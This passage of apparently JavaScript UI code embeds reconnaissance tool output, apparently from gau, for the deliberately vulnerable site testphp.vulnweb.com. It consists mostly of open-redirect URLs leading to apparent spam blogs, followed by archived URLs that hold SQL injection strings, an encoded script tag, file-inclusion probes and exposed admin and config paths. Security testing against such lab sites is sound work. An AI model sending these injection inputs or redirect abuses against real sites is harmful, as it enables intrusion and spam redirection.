      http://testphp.vulnweb.com/redir.php?r=http://recenzjefilmowe.weebly.com/
      http://testphp.vulnweb.com/redir.php?r=http://roofingsheets2.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://roofingsheets2.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://sabteratera.xyz/
      http://testphp.vulnweb.com/redir.php?r=http://sagamingthai.net/
      http://testphp.vulnweb.com/redir.php?r=http://savijoco.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seavitalgummies.com
      http://testphp.vulnweb.com/redir.php?r=http://seocountry8.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seocountry8.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seocove8.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seocove8.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews006.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews006.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1106.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1113.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1114.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews112228.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1144.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1163.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1164.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1172.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1178.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1182.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1205.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1229.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1245.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1261.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1268.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1277.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1410.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1414.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1461.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1473.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1479.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1482.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1495.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1496.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1592.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1754.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1754.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1758.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1758.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1759.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1760.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1760.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1764.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1764.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1767.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1770.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1770.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1771.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1771.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1772.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1772.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1787.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1787.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1790.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1790.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1796.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1804.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1804.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1806.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1806.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1809.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1809.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1811.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1811.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1812.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1813.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1813.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1814.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1816.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1816.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1817.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1817.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1818.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1818.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1820.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1820.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1821.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1823.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1825.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1825.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1827.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1829.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1829.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1830.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1838.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1838.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1841.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1841.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1842.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1842.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1845.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1848.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1849.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1851.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1852.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1852.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1853.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1853.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1855.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1856.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1856.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1857.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1858.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1859.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1859.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1860.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1860.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1861.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1861.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1862.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1862.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1863.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1863.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1865.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1867.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1867.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1869.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1870.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1871.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1873.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1873.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1874.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1875.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1875.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1878.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1882.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1883.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1883.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1885.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1889.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1891.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1892.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1892.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1894.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1894.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1895.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1895.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1898.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1900.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1902.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1903.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1907.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1907.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1908.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1910.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1910.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1911.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1911.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1912.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1912.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1915.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1916.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1916.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1919.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1919.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1920.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1921.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1923.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1924.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1925.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1925.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1929.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1929.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1931.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1931.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1932.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1932.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1937.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1938.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1938.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1939.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1943.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1943.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1946.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1946.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1947.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1947.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1951.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1951.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1957.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1957.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1959.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1959.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1960.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1960.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1961.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1961.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1963.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1963.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1964.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1964.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1965.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1965.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1973.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1973.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1977.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1977.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1981.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1981.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1982.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews1982.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1983.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1984.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1988.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews1990.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews2000.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews2000.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews402.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews406.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews406.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews407.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews407.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews410.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews416.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews416.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews418.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews420.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews420.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews421.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews421.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews422.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews424.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews424.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews425.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews425.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews426.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews428.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews428.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews432.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews432.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews433.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews433.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews435.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews437.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews437.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews441.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews443.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews443.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews445.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews449.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews449.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews451.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews451.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews453.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews455.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews455.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews456.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews458.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews460.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews460.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews461.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews461.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews462.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews462.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews464.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews464.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews466.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews466.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews467.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews467.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews469.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews470.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews470.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews471.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews471.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews472.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews472.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews473.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews473.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews474.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews476.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews476.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews477.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews480.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews481.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews481.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews482.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews482.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews501.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews507.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews508.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews509.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews509.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews512.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews512.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews514.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews514.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews515.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews517.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews518.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews519.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews520.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews521.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews521.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews523.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews602.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews602.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews605.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews607.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews607.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews610.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews612.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews612.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews622.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews622.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews623.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews624.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews626.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews626.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews628.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews628.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews629.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews633.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews635.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews637.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews638.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews638.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews644.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews648.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews648.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews650.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews651.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews652.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews652.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews656.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews656.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews657.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews658.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews659.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews662.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews662.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews663.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews663.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://seonews664.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://seonews666.blogspot.com/management.html
      http:/`;
      ctx.reactFlowInstance.getNode("gau-1").data.tool.stderr = `No stderr output found.`;
      ctx.reactFlowInstance.getNode("gau-1").data.tool.stdout = `http://testphp.vulnweb.com/
      http://testphp.vulnweb.com/%0A%0A%D9%87%D8%B0%D8%A7
      http://testphp.vulnweb.com:80/%20/listproducts.php?
      http://testphp.vulnweb.com:80/%20HTTP/1.1
      http://testphp.vulnweb.com/%20I%20want%20to%20start%20testing%20on%20stealing%20cookies%20through%20exploit%20xss%20on%20search%20bar%20at%20testphp%20vulnweb
      http://testphp.vulnweb.com:80/%20ip
      http://testphp.vulnweb.com:80/%20Web%20Server
      http://testphp.vulnweb.com/%25%25/index.php
      http://testphp.vulnweb.com:80/%D9%85%D8%AE%D9%84%D9%87%D8%AF
      http://testphp.vulnweb.com/%E2%80%99
      http://testphp.vulnweb.com:80/&fcbz=1
      http://testphp.vulnweb.com:80/'
      http://testphp.vulnweb.com:80/'1=1'
      http://testphp.vulnweb.com:80/(%E7%94%A8%E7%9A%84%E7%9C%8B%E5%88%B0demo,%E5%A6%82%E6%9E%9C%E4%BE%B5%E6%9D%83%E8%AF%B7%E5%91%8A%E7%9F%A5%E6%88%91)
      http://testphp.vulnweb.com:80/)
      http://testphp.vulnweb.com/,
      http://testphp.vulnweb.com:80/-1'%20OR%203*2*1=6%20AND%20000310=000310%20--
      http://testphp.vulnweb.com/.%D0%92
      http://testphp.vulnweb.com:80/.idea
      http://testphp.vulnweb.com/.idea/.name
      http://testphp.vulnweb.com:80/.idea/acuart.iml
      http://testphp.vulnweb.com/.idea/art.iml
      http://testphp.vulnweb.com:80/.idea/encodings.xml
      http://testphp.vulnweb.com:80/.idea/misc.xml
      http://testphp.vulnweb.com:80/.idea/modules.xml
      http://testphp.vulnweb.com:80/.idea/scopes
      http://testphp.vulnweb.com:80/.idea/scopes/scope_settings.xml
      http://testphp.vulnweb.com:80/.idea/vcs.xml
      http://testphp.vulnweb.com:80/.idea/workspace.xml
      http://testphp.vulnweb.com/.well-known/ai-plugin.json
      http://testphp.vulnweb.com/.well-known/assetlinks.json
      http://testphp.vulnweb.com/.well-known/dnt-policy.txt
      http://testphp.vulnweb.com/.well-known/gpc.json
      http://testphp.vulnweb.com/.well-known/trust.txt
      http://testphp.vulnweb.com:80/1
      http://testphp.vulnweb.com:80/123
      http://testphp.vulnweb.com:80/192.168.43.115
      http://testphp.vulnweb.com/404.php
      http://testphp.vulnweb.com:80/99
      http://testphp.vulnweb.com:80/%3Cscript%3E
      http://testphp.vulnweb.com/_mmServerScripts/
      http://testphp.vulnweb.com/_mmServerScripts/MMHTTPDB.php
      http://testphp.vulnweb.com/_mmServerScripts/mysql.php
      http://testphp.vulnweb.com:80/abrar
      http://testphp.vulnweb.com/Accept:
      http://testphp.vulnweb.com/acunetix_file
      http://testphp.vulnweb.com/acunetix_file///////$1$PrWp.Xbx$q4QDCqdxYE6NcMph53jie0
      http://testphp.vulnweb.com:80/acunetix_file_inclusion
      http://testphp.vulnweb.com/acunetix_file_inclusion_test
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,0,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,1,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,97,NULL,active
      http://testphp.vulnweb.com:80/adm/login.php
      http://testphp.vulnweb.com:80/adm1npan3l
      http://testphp.vulnweb.com:80/adm1nPan3l/home.php
      http://testphp.vulnweb.com:80/admin
      http://testphp.vulnweb.com:80/admin.
